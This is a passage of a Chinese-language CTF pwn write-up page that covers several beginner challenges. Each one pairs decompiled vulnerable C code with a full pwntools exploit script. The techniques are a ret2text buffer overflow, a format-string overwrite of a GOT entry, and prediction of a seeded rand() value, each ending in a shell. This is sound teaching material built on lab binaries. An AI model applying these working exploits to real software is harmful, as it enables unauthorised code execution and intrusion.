**envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fflush(<span class="built_in">stderr</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to UUCTF!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">back_door</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s so easy for you!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意栈对齐即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">	port = <span class="number">1111</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">offset = <span class="number">0x100</span> + <span class="number">8</span></span><br><span class="line">payload = flat([cyclic(offset),ret,elf.sym[<span class="string">&#x27;back_door&#x27;</span>]])</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="MoeCTF-2021-ret2text-ez"><a href="#MoeCTF-2021-ret2text-ez" class="headerlink" title="[MoeCTF 2021]ret2text_ez"></a>[MoeCTF 2021]ret2text_ez</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulations!You get it!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">	port = <span class="number">20078</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line">offset = <span class="number">0x20</span> + <span class="number">8</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">sl(flat([cyclic(offset),<span class="number">0x00000000004011AA</span>]))</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="MoeCTF-2022-babyfmt"><a href="#MoeCTF-2022-babyfmt" class="headerlink" title="[MoeCTF 2022]babyfmt"></a>[MoeCTF 2022]babyfmt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [esp+18h] [ebp-110h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [esp+1Ch] [ebp-10Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+11Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  s = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p&quot;</span>, backdoor);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift: %p\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0xFF</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意对齐，将printf的got表修改为backdoor的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">	port = <span class="number">1111</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line">rl(<span class="string">&quot;gift: &quot;</span>)</span><br><span class="line">backdoor = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).decode(<span class="string">&quot;utf-8&quot;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment"># AAAA 0xffa0d9bc 0xff (nil) 0xf7f936d0 0x3055e4 0xffa0d9d0 0xffa0db94 0xffa0da64 0xf7f8b780 0x8ed61a0 0x41414141 0x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250xa7025(nil)(nil)</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>, &#123; elf.got[<span class="string">&#x27;printf&#x27;</span>]: <span class="number">0x0804859C</span>&#125;)</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="SWPUCTF-2022-新生赛-Darling"><a href="#SWPUCTF-2022-新生赛-Darling" class="headerlink" title="[SWPUCTF 2022 新生赛]Darling"></a>[SWPUCTF 2022 新生赛]Darling</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD v4[<span class="number">2</span>]; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  pic();</span><br><span class="line">  darling();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There may be many uncertainties in the world, but the only certainty is my love for you.\n&quot;</span>);</span><br><span class="line">  v4[<span class="number">1</span>] = <span class="number">20020819</span>;</span><br><span class="line">  srand(<span class="number">0x1317E53</span>u);</span><br><span class="line">  v5 = rand() % <span class="number">100</span> - <span class="number">64</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == v4[<span class="number">0</span>] )</span><br><span class="line">    backdoor();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Oh :( , you didn&#x27;t get my love&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">	context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	ip = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">	port = <span class="number">1111</span></span><br><span class="line">	p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">	info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line">clibc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">v4 = clibc.srand(<span class="number">0x1317E53</span>)</span><br><span class="line">v5 = clibc.rand()</span><br><span class="line">v5 = v5%<span class="number">100</span>-<span class="number">64</span></span><br><span class="line">sl(<span class="built_in">str</span>(v5))</span><br><span class="line">inter()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

